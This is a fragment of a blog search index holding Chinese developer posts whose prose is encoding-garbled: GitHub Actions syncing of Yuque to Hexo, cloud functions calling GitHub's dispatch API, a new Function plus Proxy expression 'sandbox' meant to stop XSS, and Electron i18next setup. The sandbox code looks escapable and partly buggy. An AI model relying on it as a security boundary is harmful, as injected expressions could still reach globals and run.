secrets.YUQUE_TOKEN &#125;&#125; secret_id: $&#123;&#123; secrets.SECRET_ID &#125;&#125; secret_key: $&#123;&#123; secrets.SECRET_KEY &#125;&#125; runs-on: ubuntu-latest steps: - name: Checkout uses: actions/checkout@master with: submodules: true - name: Install Dependencies run: yarn install - name: Sync Yuque run: YUQUE_TOKEN=$&#123;&#123; env.yuque_token &#125;&#125; SECRET_ID=$&#123;&#123; env.secret_id &#125;&#125; SECRET_KEY=$&#123;&#123; env.secret_key &#125;&#125; yarn sync - name: Generate run: yarn build - name: Deploy uses: peaceiris/actions-gh-pages@v3 with: github_token: $&#123;&#123; secrets.ACCESS_TOKEN &#125;&#125; publish_dir: ./public æˆ–è€…ä½ çš„é¡¹ç›®ä¸­åŸæœ¬å°±æœ‰ Action çš„é…ç½®ï¼Œç°åœ¨åªéœ€è¦å¢åŠ  yuque-hexo çš„ç›¸å…³é…ç½®å°±è¡Œï¼š æ¶ˆè´¹ä¸Šé¢è®¾ç½®çš„ç¯å¢ƒå˜é‡ æ³¨æ„ environment å­—æ®µå¿…é¡»å’Œä½ åœ¨ Github Setting ä¸­é…ç½®çš„ Environments å­—æ®µå¯¹åº”ä¸Š 12345environment: github-pages env: yuque_token: $&#123;&#123; secrets.YUQUE_TOKEN &#125;&#125; secret_id: $&#123;&#123; secrets.SECRET_ID &#125;&#125; secret_key: $&#123;&#123; secrets.SECRET_KEY &#125;&#125; åœ¨è¿è¡Œ hexo generate ä¹‹å‰ï¼Œå…ˆåŒæ­¥è¯­é›€çš„æ–‡ç«  12- name: Sync Yuque run: YUQUE_TOKEN=$&#123;&#123; env.yuque_token &#125;&#125; SECRET_ID=$&#123;&#123; env.secret_id &#125;&#125; SECRET_KEY=$&#123;&#123; env.secret_key &#125;&#125; yarn sync åˆ°è¿™é‡Œ yueque-hexo çš„é…ç½®å·¥ä½œå°±å®Œæˆäº†ï¼Œä¿å­˜ï¼Œæäº¤ commit åˆ° GitHub ä¸Šè§¦å‘ Actionï¼Œå¦‚æœä¸€åˆ‡é¡ºåˆ©çš„è¯è¯­é›€çš„æ–‡ç« å°±ä¼šåŒæ­¥è¿‡æ¥ã€‚ ä¸»åŠ¨åŒæ­¥ä¸Šé¢çš„åŠ¨ä½œå®Œæˆåï¼Œæˆ‘ä»¬è™½ç„¶èƒ½å¤ŸåŒæ­¥è¯­é›€çš„æ–‡ç« ï¼Œä½†æ˜¯æˆ‘ä»¬åœ¨è¯­é›€å†™å®Œæ–‡ç« åï¼Œè¿˜éœ€è¦åˆ° github ä¸Šæ‰‹åŠ¨è§¦å‘ä¸‹ Actionï¼Œä½“éªŒè¿˜æ˜¯ä¸å¤Ÿå®Œç¾ï¼Œä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œæˆ‘ä»¬æœ‰ä¸¤ä¸ªæ–¹æ¡ˆï¼š å®šä¹‰ä»»åŠ¡ç»™ Action æ·»åŠ ä¸ªå®šæ—¶ä»»åŠ¡ï¼Œåœ¨æ¯å¤©çš„ 2:00 åŒæ­¥ä¸€æ¬¡è¯­é›€ 123on: schedule: - cron: &quot;0 2 * * *&quot; webhook åœ¨è¯­é›€å†™å®Œæ–‡ç« åï¼Œè‡ªåŠ¨è§¦å‘ä¸ª webhookï¼Œå¯åŠ¨ Github Action åŒæ­¥æ–‡ç«  ä½¿ç”¨ API è¿œç¨‹è§¦å‘ Github Action ç°åœ¨ Action åªèƒ½åœ¨æäº¤ commit åè§¦å‘ï¼Œæ–°å¢ä¸ªé…ç½®ï¼Œè®© Action æ”¯æŒè¢« api è§¦å‘ï¼š 123456789on: push: branches: - master # å…è®¸å¤–éƒ¨ä»“åº“äº‹ä»¶è§¦å‘ repository_dispatch: types: # è¿™é‡Œçš„å€¼éœ€è¦å’Œä¸‹æ–‡çš„äº‘å‡½æ•°çš„event_typeä¿æŒä¸€è‡´ - webhook è®¿é—®é“¾æ¥é¡µé¢ https://github.com/settings/tokens/new ç”³è¯·ä¸€ä¸ª Tokenï¼Œéœ€è¦å‹¾é€‰ repo æƒé™ã€‚ API è°ƒç”¨æ ¼å¼ 12345curl -X POST https://api.github.com/repos/:owner/:repo/dispatches \\ -H &quot;Accept: application/vnd.github.everest-preview+json&quot; \\ -H &quot;Authorization: token TRIGGER_TOKEN&quot; \\ --data &#x27;&#123;&quot;event_type&quot;: &quot;TRIGGER_EVENT&quot;&#125;&#x27; å…¶ä¸­ï¼Œowner æ˜¯ç”¨æˆ·åï¼Œrepo æ˜¯ä»“åº“åï¼Œ TRIGGER_TOKEN æ˜¯ä¸Šé¢ç”³è¯·çš„ Token å‡­è¯ï¼ŒTRIGGER_EVENT æ˜¯è‡ªå®šä¹‰çš„äº‹ä»¶åã€‚ è‹¥æ˜¯è¯­é›€æ”¯æŒè‡ªå®šä¹‰ webhook æ ¼å¼ï¼Œé‚£ä¹ˆæœ¬æ–‡åˆ°è¿™é‡Œå°±è¦ç»“æŸäº†ï¼Œå¯æƒœå¤©å…¬ä¸ä½œç¾ï¼Œè¯­é›€åªæ”¯æŒé…ç½®ä¸ªæ¥å£ URLã€‚é‚£ä¹ˆæˆ‘ä»¬å°±éœ€è¦å€ŸåŠ©äº‘å‡½æ•°æ¥å€’ä¸€æ‰‹äº†ï¼Œä»£ç†åçš„è°ƒç”¨è·¯å¾„å˜æˆï¼šè¯­é›€ webhook -&gt; äº‘å‡½æ•° -&gt; gtihub apiã€‚ è…¾è®¯äº‘å‡½æ•° æˆ‘è¿™é‡Œä½¿ç”¨çš„æ˜¯è…¾è®¯äº‘å‡½æ•°ï¼Œå…¶å®ƒäº‘æœåŠ¡å•†çš„äº‘å‡½æ•°åªèƒ½è‡ªå·±æ¢ç´¢äº†ã€‚ æ–°å»ºä¸ªäº‘å‡½æ•°ï¼Œæˆ‘ä»¬åªè¦åšä¸ªæ¥å£è½¬å‘ï¼Œä¸ç”¨é‚£ä¹ˆéº»çƒ¦å°±ä¸ç”¨æ¨¡æ¿äº†ï¼ˆä½œä¸ºå‰ç«¯ er å½“ç„¶é¦–é€‰ nodeï¼‰ï¼š ä¸‹é¢ç¼–è¾‘äº‘å‡½æ•°: 123456789101112131415161718192021222324252627282930&quot;use strict&quot;;const request = require(&quot;request&quot;);exports.main_handler = async (event, context) =&gt; &#123; const res = await new Promise((resolve, reject) =&gt; &#123; request( &#123; url: &quot;https://api.github.com/repos/:owner/:repo/dispatches&quot;, method: &quot;POST&quot;, json: true, headers: &#123; &quot;User-Agent&quot;: &quot;curl/7.52.1&quot;, &quot;Content-Type&quot;: &quot;application/json&quot;, Authorization: &quot;token xxxxx&quot;, Accept: &quot;application/vnd.github.everest-preview+json&quot;, &#125;, body: &#123; event_type: &quot;webhook&quot; &#125;, &#125;, function (error, response, body) &#123; if (response.status_code == 204) &#123; resolve(response); &#125; else &#123; reject(error); &#125; &#125; ); &#125;); return res;&#125;; è§¦å‘å™¨è®¾ç½®ï¼Œè§¦å‘æ–¹å¼é€‰æ‹©ã€ŒAPI ç½‘å…³è§¦å‘ã€ï¼Œå…¶å®ƒé»˜è®¤ï¼š åˆ›å»ºæˆåŠŸåï¼Œè…¾è®¯äº‘ä¼šæä¾›ä¸ªå…¬ç½‘è®¿é—®è·¯å¾„ï¼Œå°†å…¶é…ç½®åˆ°çŸ¥è¯†åº“çš„ã€Œæ¶ˆæ¯æ¨é€ã€è®¾ç½®ä¸­ï¼š AirCodeè…¾è®¯äº‘ serverless å¹¶ä¸æ˜¯å…è´¹çš„ï¼Œå‰ä¸‰ä¸ªæœˆæœ‰å…è´¹é¢åº¦,ä¹‹åæ”¶è´¹ï¼Œæ—¢ç„¶è¦ç™½å«–å°±ç™½å«–åˆ°åº•ã€‚æ¨èä½¿ç”¨ https://aircode.io/ï¼Œæ¯æœˆçš„å…è´¹é¢åº¦å¦‚ä¸‹ï¼Œç»å¯¹å¤Ÿä½ ä½¿ç”¨äº†ï¼š ä½¿ç”¨ä¹Ÿå¾ˆç®€å•ï¼Œæ–°å»ºä¸ªé¡¹ç›®åï¼Œæ·»åŠ ä¸‰ä¸ªç¯å¢ƒå˜é‡å¡«å…¥ä»¥ä¸‹ä»£ç ï¼š 1234567891011121314151617181920212223// @see https://docs.aircode.io/guide/functions/const aircode = require(&quot;aircode&quot;);const axios = require(&quot;axios&quot;);module.exports = async function (params, context) &#123; const res = await axios(&#123; url: `https://api.github.com/repos/$&#123;process.env.owner&#125;/$&#123;process.env.repo&#125;/dispatches`, method: &quot;post&quot;, headers: &#123; &quot;User-Agent&quot;: &quot;curl/7.52.1&quot;, &quot;Content-Type&quot;: &quot;application/json&quot;, Authorization: `token $&#123;process.env.token&#125;`, Accept: &quot;application/vnd.github.everest-preview+json&quot;, &#125;, data: &#123; event_type: &quot;webhook&quot; &#125;, &#125;); if (res.status) &#123; return &quot;å›è°ƒè¯·æ±‚æˆåŠŸ&quot;; &#125; return res;&#125;; ç‚¹å‡» deployæŒ‰é’®å‘å¸ƒåï¼Œä¼šå¾—åˆ°äº‘å‡½æ•°çš„å…¬ç½‘è®¿é—®è·¯å¾„ï¼Œå¡«åˆ°è¯­é›€çš„çŸ¥è¯†åº“é…ç½®ä¸­å³å¯ã€‚ å‘å¸ƒæ–‡ç« ç°åœ¨ï¼Œåœ¨å‘å¸ƒå’Œæ›´æ–°æ–‡ç« åï¼Œå³å¯è§¦å‘ Actionã€‚ æ³¨æ„äº‹é¡¹ ä¸è¦å¼€å¯è‡ªåŠ¨å‘å¸ƒï¼Œå¦åˆ™æ— æ³•è§¦å‘ webhook"},{"title":"JS - å­—ç¬¦ä¸²å‡½æ•°è¡¨è¾¾å¼","path":"/2023/01/29/0c6c2b4b35c0/","content":"æœ€è¿‘åœ¨åšä¸€ä¸ªéœ€è¦ï¼Œéœ€è¦å®ç°ä¸€ä¸ªå­—ç¬¦ä¸²å½¢å¼çš„â€œå‡½æ•°è¡¨è¾¾å¼â€ï¼Œä»¥åŒæ‹¬å·â€{{â€¦}}â€ä¸ºè¯­æ³•ç‰¹å¾ã€‚ä¾‹å¦‚ï¼š 123&#123;\ttitleï¼š&quot;&#123;&#123;formData.x.y === &#x27;us&#x27; ? &#x27;ç¾å…ƒ&#x27;:&#x27;äººæ°‘å¸&#x27;&#125;&#125;&quot;&#125; å¹¶ä¸”å‡½æ•°è¡¨è¾¾å¼å†…ç½®äº†ä¸€äº›å…³é”®è¯ï¼š $self - ä»£è¡¨å½“å‰å­—æ®µå®ä¾‹ï¼Œç”¨æ¥è·å–å½“å‰å­—æ®µçš„å€¼å’Œ schema é…ç½® $values - ä»£è¡¨æ•´ä¸ªè¡¨å•æ•°æ® $form - ä»£è¡¨å½“å‰ Form å®ä¾‹ï¼Œå¯ä»¥ç”¨æ¥è§¦å‘è¡¨å•æ ¡éªŒç­‰æ“ä½œ $deps - è·å– dependencies ä¸­ä¾èµ–é¡¹çš„å€¼ï¼Œå’Œ dependencies é¡ºåºä¸€è‡´ $fetch - ä½¿ç”¨å°è£…çš„ request æ–¹æ³•ï¼Œå‘é€ http è¯·æ±‚ ä½¿ç”¨äº†å…³é”®è¯çš„è¡¨è¾¾å¼å¦‚ä¸‹ï¼š 123&#123; select_options: &quot;&#123;&#123;$self.select_options.map(item =&gt; (&#123; ...item, disabled: $deps[0].map(it =&gt; it.bank_card_usage).includes(item.value) &#125;))&#125;&#125;&quot;;&#125; å‡½æ•°è¡¨è¾¾å¼å¯èƒ½ç”±åç«¯ä¸‹å‘æˆ–è€…ç”¨æˆ·è¾“å…¥ï¼Œå› æ­¤ä¸ºé˜²æ­¢ XSS æ³¨å…¥ï¼Œå‡½æ•°è¡¨è¾¾å¼çš„ä½œç”¨åŸŸéœ€è¦é™åˆ¶ä¸‹ã€‚ å®ç°new Function è¯­æ³• å¼•ç”¨è‡ªï¼š å®ç°å‡½æ•°è¡¨è¾¾å¼ä¹‹å‰ï¼Œæˆ‘ä»¬å…ˆå¤ä¹ ä¸‹ new Function è¯­æ³•ï¼š 1let func = new Function([arg1, arg2, ...argN], functionBody); æœ€åä¸€ä¸ªå‚æ•°ä¸€å®šæ˜¯å‡½æ•°ä½“ï¼Œå…¶ä½™å‚æ•°éƒ½ä½œä¸ºä¼ ç»™å‡½æ•°ä½“çš„å‚æ•°ã€‚ä¾‹å¦‚ï¼š 123let sum = new Function(&quot;a&quot;, &quot;b&quot;, &quot;return a + b&quot;);console.log(sum(1, 2)); // ç»“æœæ˜¯ 3 å¹³å¸¸è¿›è¡Œ JS æˆ–è€… Node.js å¼€å‘çš„æ—¶å€™ï¼Œæˆ‘ä»¬æ˜¯æ²¡æœ‰ä»»ä½•ç†ç”±ä½¿ç”¨ new Function æ„é€ å‡½æ•°çš„ï¼Œå› ä¸ºæ²¡å¿…è¦ï¼Œç›´æ¥ä½¿ç”¨ function æˆ–è€… () &#x3D;&gt; {} ç®­å¤´å‡½æ•°å†™æ³•å°±å¥½äº†ã€‚ é‚£æ˜¯ä¸æ˜¯è¡¨ç¤º new Function è¯­æ³•æ˜¯ä¸ªé¸¡è‚‹ç‰¹æ€§å‘¢ï¼Ÿ ä¸ï¼ç»ä¸æ˜¯ï¼ new Function è¯­æ³•æœ‰ä¸ªç‰¹åˆ«å‰å®³çš„ç‰¹æ€§ï¼Œä½¿å…¶æˆä¸º JavaScript è¿™é—¨è¯­è¨€ä¸­æ— å¯æ›¿ä»£çš„é‡è¦è§’è‰²ã€‚ã€‚ ä»€ä¹ˆç‰¹æ€§å‘¢ï¼Ÿ é‚£å°±æ˜¯å‡½æ•°ä½“çš„æ•°æ®æ ¼å¼æ˜¯å­—ç¬¦ä¸²ï¼Œè¿™å¯æ˜¯ä¸ªä¸å¾—äº†çš„ä¸œè¥¿å•Šï¼ è§£æå‡½æ•°è¡¨è¾¾å¼åˆ©ç”¨ new Function çš„è¯­æ³•ç‰¹æ€§ï¼Œæˆ‘ä»¬å°±å¯ä»¥å°†å­—ç¬¦ä¸²å˜æˆå¯æ‰§è¡Œçš„ä»£ç ï¼š 12345const compile = (expression: string, scope = &#123;&#125;) =&gt; &#123; return new Function(&quot;$root&quot;, `with($root) &#123; return ($&#123;expression&#125;); &#125;`)( scope );&#125;; compile å‡½æ•°æœ‰ä¸¤ä¸ªå‚æ•°ï¼Œç¬¬ä¸€ä¸ªå‚æ•°ä¸ºè¦æ‰§è¡Œçš„å­—ç¬¦ä¸²è¡¨è¾¾å¼ï¼Œç¬¬äºŒä¸ªå‚æ•°ä¸ºæ‰§è¡Œæ—¶çš„ä½œç”¨åŸŸï¼Œå°† $self ç­‰å†…ç½®å…³é”®è¯ä¼ å…¥ scope ä¾›å‡½æ•°æ‰§è¡Œæ—¶è°ƒç”¨ã€‚ compile å®ç°æ—¶ä½¿ç”¨äº† with å…³é”®è¯ï¼Œå¸®åŠ©æˆ‘ä»¬ç®€åŒ–ä»£ç ï¼Œå¦‚æœä¸ä½¿ç”¨ with å…³é”®è¯ï¼Œscope é‡Œæ‰€æœ‰çš„å…ƒç´ éƒ½éœ€è¦ä¾æ¬¡ä¼ å…¥ new Function ä¸­ï¼š 12345const compile = (expression, scope = &#123;&#125;) =&gt; &#123; const keys = Object.keys(scope); const values = keys.map((key) =&gt; scope[key]); return new Function(...keys, `return ($&#123;expression&#125;);`)(...values);&#125;; ä¸è¿‡ï¼Œwith åœ¨æ€§èƒ½å’Œè¯­ä¹‰æ–¹é¢éƒ½æœ‰äº›é—®é¢˜ï¼ˆå…·ä½“é—®é¢˜è§ï¼šhttps://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Statements/withï¼‰ï¼Œè‡³äºç”¨ä¸ç”¨ï¼Œè‡ªå·±è€ƒè™‘å§ é™åˆ¶ä½œç”¨åŸŸç°åœ¨å­—ç¬¦ä¸²å¾—ä»¥æ‰§è¡Œäº†ï¼Œæ¥ä¸‹æ¥éœ€è¦è§£å†³çš„å°±æ˜¯å‡½æ•°çš„ä½œç”¨åŸŸé—®é¢˜äº†ã€‚ ç”± Function æ„é€ å‡½æ•°åˆ›å»ºçš„å‡½æ•°ä¸ä¼šåˆ›å»ºå½“å‰ç¯å¢ƒçš„é—­åŒ…ï¼Œå®ƒä»¬æ€»æ˜¯è¢«åˆ›å»ºäºå…¨å±€ç¯å¢ƒï¼Œå› æ­¤åœ¨è¿è¡Œæ—¶å®ƒä»¬åªèƒ½è®¿é—®å…¨å±€å˜é‡å’Œè‡ªå·±çš„å±€éƒ¨å˜é‡ï¼Œä¸èƒ½è®¿é—®å®ƒä»¬è¢« Function æ„é€ å‡½æ•°åˆ›å»ºæ—¶æ‰€åœ¨çš„ä½œç”¨åŸŸçš„å˜é‡ã€‚ 12345678910111213141516171819var x = 10;function createFunction1() &#123; var x = 20; return new Function(&quot;return x;&quot;); // è¿™é‡Œçš„ x æŒ‡å‘æœ€ä¸Šé¢å…¨å±€ä½œç”¨åŸŸå†…çš„ x&#125;function createFunction2() &#123; var x = 20; function f() &#123; return x; // è¿™é‡Œçš„ x æŒ‡å‘ä¸Šæ–¹æœ¬åœ°ä½œç”¨åŸŸå†…çš„ x &#125; return f;&#125;var f1 = createFunction1();console.log(f1()); // 10var f2 = createFunction2();console.log(f2()); // 20 å› æ­¤ï¼Œå¦‚æœä»…ä»…æ˜¯é™åˆ¶è¡¨è¾¾å¼è®¿é—®åˆ›å»ºæ—¶æ‰€åœ¨çš„ä½œç”¨åŸŸçš„å˜é‡ï¼Œnew Function å°±è¶³å¤Ÿäº†ï¼Œå¦‚æœè¿˜æƒ³è¦é™åˆ¶è®¿é—®å…¨å±€ä½œç”¨åŸŸï¼Œé‚£ä¹ˆå°±è¦å®ç°ä¸€ä¸ªæ²™ç®±äº†ã€‚ æ²™ç®± å¼•ç”¨è‡ªï¼š ä»€ä¹ˆæ˜¯æ²™ç®±ï¼Ÿåœ¨è®¡ç®—æœºå®‰å…¨ä¸­ï¼Œæ²™ç®±ï¼ˆSandboxï¼‰æ˜¯ä¸€ç§ç”¨äºéš”ç¦»æ­£åœ¨è¿è¡Œç¨‹åºçš„å®‰å…¨æœºåˆ¶ï¼Œé€šå¸¸ç”¨äºæ‰§è¡Œæœªç»æµ‹è¯•æˆ–ä¸å—ä¿¡ä»»çš„ç¨‹åºæˆ–ä»£ç ï¼Œå®ƒä¼šä¸ºå¾…æ‰§è¡Œçš„ç¨‹åºåˆ›å»ºä¸€ä¸ªç‹¬ç«‹çš„æ‰§è¡Œç¯å¢ƒï¼Œå†…éƒ¨ç¨‹åºçš„æ‰§è¡Œä¸ä¼šå½±å“åˆ°å¤–éƒ¨ç¨‹åºçš„è¿è¡Œã€‚ å¸¸è§çš„æ²™ç®±åº”ç”¨åœºæ™¯ï¼š æ‰§è¡Œ JSONP è¯·æ±‚å›æ¥çš„å­—ç¬¦ä¸²æ—¶æˆ–å¼•å…¥ä¸çŸ¥åç¬¬ä¸‰æ–¹ JS åº“æ—¶ï¼Œå¯èƒ½éœ€è¦åˆ›é€ ä¸€ä¸ªæ²™ç®±æ¥æ‰§è¡Œè¿™äº›ä»£ç ã€‚ Vue æ¨¡æ¿è¡¨è¾¾å¼çš„è®¡ç®—æ˜¯è¿è¡Œåœ¨ä¸€ä¸ªæ²™ç›’ä¹‹ä¸­çš„ï¼Œåœ¨æ¨¡æ¿å­—ç¬¦ä¸²ä¸­çš„è¡¨è¾¾å¼åªèƒ½è·å–éƒ¨åˆ†å…¨å±€å¯¹è±¡ï¼Œè¿™ä¸€ç‚¹å®˜æ–¹æ–‡æ¡£æœ‰æåˆ°ï¼Œè¯¦æƒ…å¯å‚é˜…æºç ã€‚ åœ¨çº¿ä»£ç ç¼–è¾‘å™¨ï¼Œå¦‚ CodeSanbox ç­‰åœ¨çº¿ä»£ç ç¼–è¾‘å™¨åœ¨æ‰§è¡Œè„šæœ¬æ—¶éƒ½ä¼šå°†ç¨‹åºæ”¾ç½®åœ¨ä¸€ä¸ªæ²™ç®±ä¸­ï¼Œé˜²æ­¢ç¨‹åºè®¿é—®&#x2F;å½±å“ä¸»é¡µé¢ã€‚ å¤Ÿç”¨çš„æ²™ç®±å®ç°ï¼šProxy ä¸­çš„ get å’Œ set æ–¹æ³•åªèƒ½æ‹¦æˆªå·²å­˜åœ¨äºä»£ç†å¯¹è±¡ä¸­çš„å±æ€§ï¼Œå¯¹äºä»£ç†å¯¹è±¡ä¸­ä¸å­˜åœ¨çš„å±æ€§è¿™ä¸¤ä¸ªé’©å­æ˜¯æ— æ„ŸçŸ¥çš„ã€‚å› æ­¤è¿™é‡Œæˆ‘ä»¬ä½¿ç”¨ Proxy.has() æ¥æ‹¦æˆª with ä»£ç å—ä¸­çš„ä»»æ„å˜é‡çš„è®¿é—®ï¼Œå¹¶è®¾ç½®ä¸€ä¸ªç™½åå•ï¼Œåœ¨ç™½åå•å†…çš„å˜é‡å¯ä»¥æ­£å¸¸èµ°ä½œç”¨åŸŸé“¾çš„è®¿é—®æ–¹å¼ï¼Œä¸åœ¨ç™½åå•å†…çš„å˜é‡ä¼šç»§ç»­åˆ¤æ–­æ˜¯å¦å­˜åœ¨æ²™ç®±è‡ªè¡Œç»´æŠ¤çš„ä¸Šä¸‹æ–‡å¯¹è±¡ä¸­ï¼Œå­˜åœ¨åˆ™æ­£å¸¸è®¿é—®ï¼Œä¸å­˜åœ¨åˆ™ç›´æ¥æŠ¥é”™ã€‚ 1234567891011121314151617181920212223242526272829303132333435363738394041424344const withedCode = (code: string) =&gt; &#123; return new Function(&quot;$root&quot;, `with($root) &#123; return ($&#123;code&#125;); &#125;`);&#125;;// å¯è®¿é—®å…¨å±€ä½œç”¨åŸŸçš„ç™½åå•åˆ—è¡¨const access_white_list = [&quot;Math&quot;, &quot;Date&quot;];const Sandbox = (code: string, scope = &#123;&#125;) =&gt; &#123; // æ‰§è¡Œä¸Šä¸‹æ–‡å¯¹è±¡çš„ä»£ç†å¯¹è±¡ const scopeProxy = new Proxy(scope, &#123; has: (target, prop) =&gt; &#123; // has å¯ä»¥æ‹¦æˆª with ä»£ç å—ä¸­ä»»æ„å±æ€§çš„è®¿é—® if (access_white_list.includes(prop)) &#123; // åœ¨å¯è®¿é—®çš„ç™½åå•å†…ï¼Œå¯ç»§ç»­å‘ä¸ŠæŸ¥æ‰¾ return target.hasOwnProperty(prop); &#125; if (!target.hasOwnProperty(prop)) &#123; throw new Error(`Invalid expression - $&#123;prop&#125;! You can not do that!`); &#125; return true; &#125;, &#125;); withedCode(code).call(scopeProxy, scopeProxy);&#125;;// æ‰§è¡Œä¸Šä¸‹æ–‡å¯¹è±¡const scope = &#123; func: (variable) =&gt; &#123; console.log(variable); &#125;, foo: &quot;foo&quot;,&#125;;// å¾…æ‰§è¡Œç¨‹åºconst code = ` Math.random() location.href = &#x27;xxx&#x27; func(foo)`;console.log(Sandbox(code, scope)); æœ€ç»ˆå®ç°ç‰ˆæœ¬12345678910111213141516171819202122232425262728293031323334353637const scope = &#123; $self: &quot;xxxx&quot;,&#125;;const ExpRE = /^\\s*\\&#123;\\&#123;([\\s\\S]*)\\&#125;\\&#125;\\s*$/;const withedCode = (code: string) =&gt; &#123; return new Function(&quot;$root&quot;, `with($root) &#123; return ($&#123;code&#125;); &#125;`);&#125;;// å¯è®¿é—®å…¨å±€ä½œç”¨åŸŸçš„ç™½åå•åˆ—è¡¨const access_white_list = [&quot;Math&quot;, &quot;Date&quot;];const Sandbox = (source: string, scope = &#123;&#125;) =&gt; &#123; const matched = source.match(ExpRE); if (!matched) return source; const code = matched[1]; // æ‰§è¡Œä¸Šä¸‹æ–‡å¯¹è±¡çš„ä»£ç†å¯¹è±¡ const scopeProxy = new Proxy(scope, &#123; has: (target, prop) =&gt; &#123; // has å¯ä»¥æ‹¦æˆª with ä»£ç å—ä¸­ä»»æ„å±æ€§çš„è®¿é—® if (access_white_list.includes(prop)) &#123; // åœ¨å¯è®¿é—®çš„ç™½åå•å†…ï¼Œå¯ç»§ç»­å‘ä¸ŠæŸ¥æ‰¾ return target.hasOwnProperty(prop); &#125; if (!target.hasOwnProperty(prop)) &#123; throw new Error(`Invalid expression - $&#123;prop&#125;! You can not do that!`); &#125; return true; &#125;, &#125;); withedCode(code).call(scopeProxy, scopeProxy);&#125;;"},{"title":"Electron - ä½¿ç”¨ i18next & react-i18next è¿›è¡Œå›½é™…åŒ–","path":"/2023/01/28/6c1ff1435713/","content":"i18next æ˜¯ç¤¾åŒºä¸­ä¼˜ç§€çš„å›½é™…åŒ–æ¡†æ¶ï¼Œåœ¨ react ä¸­å¹¿æ³›ä½¿ç”¨ï¼Œæˆ‘å¸çš„å¤§é‡äº§å“éƒ½ä½¿ç”¨ i18next è¿›è¡Œå›½é™…åŒ–ï¼Œè€Œ react-i18next æ˜¯ i18next çš„ä¸€ä¸ªæ‰©å±•ï¼Œæä¾›äº†ä¸€äº› HOC åŠ hook æ–¹ä¾¿æˆ‘ä»¬åœ¨ react ä¸­ä½¿ç”¨ i18nextã€‚ ç”±äº electron æ˜¯å¤šè¿›ç¨‹æœºåˆ¶ï¼Œä¸»è¿›ç¨‹å’Œæ¸²æŸ“è¿›ç¨‹éƒ½éœ€è¦ä¸ª i18next å®ä¾‹ï¼Œä½†æ˜¯å¤šå®ä¾‹å¸¦æ¥äº†ä¸€äº›é—®é¢˜ï¼Œæ¯”å¦‚å¤šå®ä¾‹çš„è¯­è¨€å¦‚ä½•åŒæ­¥ï¼Œæ–‡æ¡ˆå¦‚ä½•é›†ä¸­ç®¡ç†ï¼Ÿ é’ˆå¯¹ä¸Šé¢çš„ä¸¤ä¸ªé—®é¢˜ï¼Œç»è¿‡å®è·µï¼Œæˆ‘ç»™å‡ºçš„è§£å†³æ–¹æ¡ˆå¦‚ä¸‹ï¼š ä¸»è¿›ç¨‹è´Ÿè´£åŠ è½½ç”¨æˆ·é€‰æ‹©çš„è¯­è¨€å’Œå¯¹åº”çš„æ–‡æ¡ˆ æ¸²æŸ“è¿›ç¨‹é€šè¿‡è¿›ç¨‹é€šä¿¡ä»ä¸»è¿›ç¨‹çš„å®ä¾‹ä¸Šè·å–åˆå§‹åŒ–è¯­è¨€å’Œæ–‡æ¡ˆåˆå§‹åŒ–å®ä¾‹ ç”¨æˆ·åœ¨æ¸²æŸ“è¿›ç¨‹åˆ‡æ¢è¯­è¨€ï¼Œé€šè¿‡è¿›ç¨‹é€šä¿¡ï¼Œä¸»è¿›ç¨‹çš„ i18next å®ä¾‹åŠ è½½æ–°è¯­è¨€çš„æ–‡æ¡ˆï¼Œå¹¶è¿”å›ç»™æ¸²æŸ“è¿›ç¨‹åŠ¨æ€åŠ è½½åˆ°æ¸²æŸ“è¿›ç¨‹çš„å®ä¾‹ä¸­ æ•´ä¸ªæµç¨‹å¤§è‡´å¦‚ä¸‹ï¼š ä¸»è¿›ç¨‹ç”¨æˆ·é€‰æ‹©çš„ç³»ç»Ÿè¯­è¨€ä¿å­˜åœ¨ electron-store ä¸­ï¼Œé€šè¿‡ getConfigStoreæ–¹æ³•è·å–ä¸Šæ¬¡ç”¨æˆ·é€‰æ‹©çš„ç³»ç»Ÿè¯­è¨€ï¼Œé»˜è®¤ä¸ºä¸­æ–‡ 123456789101112131415import Store from &quot;electron-store&quot;;export interface StoreState &#123; theme: string; config: NOTES.Config;&#125;export const getConfigStore = &lt;K extends keyof NOTES.Config&gt;(key: K) =&gt; &#123; return getStore&lt;NOTES.Config[K]&gt;(`config.$&#123;key&#125;`);&#125;;export const setConfigStore = (value: Partial&lt;NOTES.Config&gt;) =&gt; &#123; const config = getAllConfigStore(); return setStore(&quot;config&quot;, &#123; ...config, ...value &#125;);&#125;; i18next-fs-backend æ˜¯ i18next çš„ä¸€ä¸ªæ‰©å±•ï¼Œå…è®¸ Node.js ä»æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿä¸­åŠ è½½ç¿»è¯‘ 1234567891011121314151617import i18next from &quot;i18next&quot;;import i18nextBackend from &quot;i18next-fs-backend&quot;;import &#123; getConfigStore &#125; from &quot;./store&quot;;i18next.use(i18nextBackend).init(&#123; lng: getConfigStore(&quot;lang&quot;) || &quot;zh-CN&quot;, fallbackLng: &quot;en-US&quot;, backend: &#123; loadPath: path.join(__dirname, &quot;./i18n/&#123;&#123;lng&#125;&#125;.json&quot;), &#125;, interpolation: &#123; escapeValue: false, // react already safes from xss &#125;,&#125;);export default i18next; i18next å®ä¾‹åˆå§‹åŒ–åï¼Œé€šè¿‡ loadLanguagesåŠ è½½å¯¹åº”è¯­è¨€çš„æ–‡æ¡ˆï¼ŒgetResourceBundleè·å–è¯­è¨€çš„æ–‡æ¡ˆï¼Œé€šè¿‡è¿™ä¸¤ä¸ªæ–¹æ³•ï¼Œæ¸²æŸ“è¿›ç¨‹å°±å¯ä»¥å…±äº«ä¸»è¿›ç¨‹çš„æ–‡æ¡ˆï¼Œå®ç°æ–‡æ¡ˆçš„é›†ä¸­ç®¡ç†ã€‚ 12345678910111213141516171819202122232425262728293031import logger from &quot;electron-log&quot;;import i18next, &#123; LngOptions &#125; from &quot;../../utils/i18n&quot;;export const getI18nLanguages = () =&gt; &#123; return LngOptions;&#125;;export const getI18nInitResource = async () =&gt; &#123; const lng = i18next.language; const resource = await getI18nResource(lng); return &#123; lng, resource &#125;;&#125;;export const getI18nResource = async (lng: string) =&gt; &#123; await i18next.loadLanguages(lng).catch((err) =&gt; &#123; logger.error(err); &#125;); return i18next.getResourceBundle(lng, &quot;&quot;);&#125;;export const changeI18nLang = async (lng: string) =&gt; &#123; return new Promise&lt;boolean&gt;((resolve) =&gt; &#123; i18next.changeLanguage(lng, (err) =&gt; &#123; if (err) logger.error(err); resolve(!err); &#125;); &#125;);&#125;; æ¸²æŸ“è¿›ç¨‹invokeCommandåŒå­¦ window 